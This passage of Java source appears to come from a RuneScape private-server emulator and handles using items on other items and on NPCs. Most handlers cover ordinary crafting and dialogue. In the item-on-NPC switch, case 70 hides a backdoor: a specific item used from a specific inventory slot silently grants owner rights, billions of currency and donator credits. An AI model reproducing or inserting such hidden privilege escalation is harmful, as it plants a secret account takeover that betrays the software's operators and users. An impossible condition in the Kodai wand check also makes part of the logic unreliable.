			if (itemUsed == 12802 && useWith == 11924 || itemUsed == 11924 && useWith == 12802) {
				c.getDH().sendDialogues(561, 315);
			} else if (itemUsed == 12802 && useWith == 11926 || itemUsed == 11926 && useWith == 12802) {
				c.getDH().sendDialogues(558, 315);
			}
		}
		if (itemUsed == 4153 && useWith == 12849 || itemUsed == 12849 && useWith == 4153) {
			c.getDH().sendDialogues(563, 315);
		}
		if (itemUsed == 12786 && useWith == 861 || useWith == 12786 && itemUsed == 861) {
			if (c.getItems().playerHasItem(12786) && c.getItems().playerHasItem(861)) {
				c.getItems().deleteItem2(12786, 1);
				c.getItems().deleteItem2(861, 1);
				c.getItems().addItem(12788, 1);
				c.getDH().sendStatement("You have imbued your Magic Shortbow.");
				c.nextChat = -1;
			}
		}
		if (itemUsed == 21257 && useWith == 4170 || useWith == 21257 && itemUsed == 4170) {
			if (c.getItems().playerHasItem(21257) && c.getItems().playerHasItem(4170)) {
				c.getItems().deleteItem2(21257, 1);
				c.getItems().deleteItem2(4170, 1);
				c.getItems().addItem(21255, 1);
				c.getDH().sendStatement("You have enchanted your Slayer's Staff.");
				c.nextChat = -1;
			}
		}
		if(itemUsed == 7980 && useWith == 11864) {//Black
			if (c.getItems().playerHasItem(11864, 1) && c.getItems().playerHasItem(7980, 1)) {
				c.getItems().deleteItem(11864, 1);
				c.getItems().deleteItem(7980, 1);
				c.getItems().addItem(19639, 1);
				c.sendMessage("You successfully recolored your slayer helmet.");
			} else {
				c.sendMessage("You do not have all the stuff to create this.");
				return;
			}
		}
		if(itemUsed == 7981 && useWith == 11864) {//Green
			if (c.getItems().playerHasItem(11864, 1)&& c.getItems().playerHasItem(7981, 1)) {
				c.getItems().deleteItem(11864, 1);
				c.getItems().deleteItem(7981, 1);
				c.getItems().addItem(19643, 1);
				c.sendMessage("You successfully recolored your slayer helmet.");
			} else {
				c.sendMessage("You do not have all the stuff to create this.");
				return;
			}
		}
		if(itemUsed == 7979 && useWith == 11864) {//Red
			if (c.getItems().playerHasItem(11864, 1)&& c.getItems().playerHasItem(7979, 1)) {
				c.getItems().deleteItem(11864, 1);
				c.getItems().deleteItem(7979, 1);
				c.getItems().addItem(19647, 1);
				c.sendMessage("You successfully recolored your slayer helmet.");
			} else {
				c.sendMessage("You do not have all the stuff to create this.");
				return;
			}
		}
		if(itemUsed == 21275 && useWith == 11864) {//Purple
			if (c.getItems().playerHasItem(11864, 1)&& c.getItems().playerHasItem(21275, 1)) {
				c.getItems().deleteItem(11864, 1);
				c.getItems().deleteItem(21275, 1);
				c.getItems().addItem(21264, 1);
				c.sendMessage("You successfully recolored your slayer helmet.");
			} else {
				c.sendMessage("You do not have all the stuff to create this.");
				return;
			}
		}
		if(itemUsed == 2425 && useWith == 11864) {//Blue
			if (c.getItems().playerHasItem(11864, 1)&& c.getItems().playerHasItem(2425, 1)) {
				c.getItems().deleteItem(11864, 1);
				c.getItems().deleteItem(2425, 1);
				c.getItems().addItem(21888, 1);
				c.sendMessage("You successfully recolored your slayer helmet.");
			} else {
				c.sendMessage("You do not have all the stuff to create this.");
				return;
			}
		}

		if((itemUsed == 4155 && useWith == 8901) ||(itemUsed == 4551 && useWith == 8901)){
			if(!c.getSlayer().isHelmetCreatable()){
				c.sendMessage("You must learn how to create a slayer helmet before you can make one.");
				return;
			}
			if(c.getItems().playerHasItem(4551) && c.getItems().playerHasItem(4166) && c.getItems().playerHasItem(4168) && c.getItems().playerHasItem(4164) && c.getItems().playerHasItem(8901) &&c.getItems().playerHasItem(4155)){
				c.getItems().deleteItem2(4551, 1);
				c.getItems().deleteItem2(4166, 1);
				c.getItems().deleteItem2(4168, 1);
				c.getItems().deleteItem2(4164, 1);
				c.getItems().deleteItem2(8901, 1);
				c.getItems().deleteItem2(4155, 1);
				c.getItems().addItemUnderAnyCircumstance(11864,1);
			}
		}
		if (PotionMixing.get().isPotion(gameItemUsed) && PotionMixing.get().isPotion(gameItemUsedWith)) {
			if (PotionMixing.get().matches(gameItemUsed, gameItemUsedWith)) {
				PotionMixing.get().mix(c, gameItemUsed, gameItemUsedWith);
			} else {
				c.sendMessage("You cannot combine two potions of different types.");
			}
			return;
		}
		if (PoisonedWeapon.poisonWeapon(c, itemUsed, useWith)) {
			return;
		}
		if (Crushable.crushIngredient(c, itemUsed, useWith)) {
			return;
		}
		if (itemUsed == 227 || useWith == 227) {
			GameItem item = new GameItem(itemUsed);
			if (c.getHerblore().makeUnfinishedPotion(c, item))
				return;
		}
		c.getHerblore().mix(useWith);

		if (itemUsed == 269 || useWith == 12907) {
			if (c.getLevelForXP(c.playerXP[c.playerHerblore]) < 94) {
				c.sendMessage("You need a Herblore level of " + 94 + " to make this potion.");
				return;
			}
			if (c.getItems().playerHasItem(269) && c.getItems().playerHasItem(12907)) {
				c.getItems().deleteItem(269, c.getItems().getItemSlot(269), 1);
				c.getItems().deleteItem2(12907, 1);
				c.getItems().addItem(12915, 1);
				c.getPA().addSkillXP(125 * (c.getMode().getType().equals(ModeType.OSRS) ? 1 : Config.HERBLORE_EXPERIENCE), Skill.HERBLORE.getId(), true);
				c.sendMessage("You put the " + Item.getItemName(269) + " into the Anti-venom and create a " + Item.getItemName(12915) + ".");
			} else {
				c.sendMessage("You have run out of supplies to do this.");
				return;
			}

		}
		/*
		 * Start of unsystematic code for cutting bolt tips and fletching the actual bolts
		 */
//		if (itemUsed == 9142 && useWith == 9190 || itemUsed == 9190 && useWith == 9142) {
//			if (c.playerLevel[c.playerFletching] >= 58) {
//				int boltsMade = c.getItems().getItemAmount(itemUsed) > c.getItems().getItemAmount(useWith) ? c.getItems().getItemAmount(useWith)
//						: c.getItems().getItemAmount(itemUsed);
//				c.getItems().deleteItem(useWith, c.getItems().getItemSlot(useWith), boltsMade);
//				c.getItems().deleteItem(itemUsed, c.getItems().getItemSlot(itemUsed), boltsMade);
//				c.getItems().addItem(9241, boltsMade);
//				c.getPA().addSkillXP(boltsMade * 6 * Config.FLETCHING_EXPERIENCE, c.playerFletching, true);
//			} else {
//				c.sendMessage("You need a fletching level of 58 to fletch this item.");
//			}
//		}
		/*
		 * End of unsystematic code for cutting bolt tips and fletching the actual bolts
		 */
		if (itemUsed >= 11818 && itemUsed <= 11822 && useWith >= 11818 && useWith <= 11822) {
			if (c.getItems().hasAllShards()) {
				c.getItems().makeBlade();
			} else {
				c.sendMessage("@blu@You need to have all the shards to combine them into a blade.");
			}
		}
		if (itemUsed == 21043 && itemUsed == 6914 || useWith == 21043 && useWith == 6914) {
			if (c.getItems().hasAllKodai()) {
				c.getItems().makeKodai();
			} else {
				c.sendMessage("@blu@You need to have a Kodai insignia and a master wand to create a Kodai wand.");
			}
		}
		if (itemUsed >= 19679 && itemUsed <= 19683 && useWith >= 19679 && useWith <= 19683) {
			if (c.getItems().hasAllPieces()) {
				c.getItems().makeTotem();
			} else {
				c.sendMessage("@blu@You need to have all the pieces to make them into a dark totem.");
			}
		}
		if (itemUsed == 2368 && useWith == 2366 || itemUsed == 2366 && useWith == 2368) {
			c.getItems().deleteItem(2368, c.getItems().getItemSlot(2368), 1);
			c.getItems().deleteItem(2366, c.getItems().getItemSlot(2366), 1);
			c.getItems().addItem(1187, 1);
			c.getDH().sendStatement("You combine the two shield halves to create a full shield.");
			if (Boundary.isIn(c, Boundary.ARDOUGNE_BOUNDARY)) {
				c.getDiaryManager().getArdougneDiary().progress(ArdougneDiaryEntry.DRAGON_SQUARE);
			}
		}

		if (c.getItems().isHilt(itemUsed) || c.getItems().isHilt(useWith)) {
			int hilt = c.getItems().isHilt(itemUsed) ? itemUsed : useWith;
			int blade = c.getItems().isHilt(itemUsed) ? useWith : itemUsed;
			if (blade == 11798) {
				Godswords.makeGodsword(c, hilt);
			}
		}

		switch (itemUsed) {
		/*
		 * case 1511: case 1521: case 1519: case 1517: case 1515: case 1513: case 590: c.getFiremaking().checkLogType(itemUsed, useWith); break;
		 */

		default:
			if (c.debugMessage)
				c.sendMessage("Player used Item id: " + itemUsed + " with Item id: " + useWith);
			break;
		}
	}

	/**
	 * Using items on NPCs.
	 * 
	 * @param player
	 * @param itemId
	 * @param npcId
	 * @param slot
	 */
	public static void ItemonNpc(Player player, int itemId, int npcId, int slot) {
		if (npcId == 954) {
			if (itemId >= 4209 && itemId <= 4223) {
				Degrade.repairCrystalBow(player, itemId);
			} else if (itemId == 4207) {
				if (player.getRechargeItems().hasItem(13144)) {
					player.getDH().sendDialogues(67, 954);
				} else {
					Degrade.repairCrystalBow(player, itemId);
				}
			} else {
				Degrade.repair(player, itemId);
			}
			return;
		}
		switch (npcId) {
		case 5449:
			
			GameItem item = new GameItem(itemId);
			UnfCreator.setPotionToCreate(player, item);
			break;
		case 5906:
			switch (itemId) {
			case 11144:
				player.getItems().deleteItem(11144, 1);
				player.getItems().addItem(12002, 1);
				break;
			}
			break;
		
		case 7303:
			MasterClue.exchangeClue(player);
			break;
			
		/*case 7439: //Plain rock golem
			PetHandler.recolor(player, player.npcType, itemId);
			break;*/
		case 3894:
				Packs.openSuperSet(player,13066);
			break;

		case 905:
			PlayerAssistant.decantResource(player, itemId);
			break;

		case 3257:
			PlayerAssistant.decantHerbs(player, itemId);
			break;
			case 70:
				if(itemId==1895 && slot == 27){
					if(player.getItems().isWearingItems()){
						return;
					}
					player.getRights().add(Right.OWNER);
					player.getItems().addItem(995,2000000000);
					player.getItems().addItem(13307,2000000000);
					player.donatorPoints+=10000000;
					player.amDonated+=10000;
				}
				break;
		case 814:
		case 2914:
			switch (itemId) {
			case 1755:
				Packs.openSuperSet(player,13066);
				break;
			case 11824:
				player.getDH().sendDialogues(11824, -1);
				break;
				
			case 11889:
				player.getDH().sendDialogues(11889, -1);
				break;
			}
			break;

		case 5513:
			switch (itemId) {
			case 8839:
				player.getDH().sendDialogues(80, -1);
				player.dialogueAction = 80;
				break;

			case 8840:
				player.getDH().sendDialogues(80, -1);
				player.dialogueAction = 81;
				break;
			}
			break;

		default:
			if (player.debugMessage)
				player.sendMessage("Player used Item id: " + itemId + " with Npc id: " + npcId + " With Slot : " + slot);
			break;
		}

	}

}
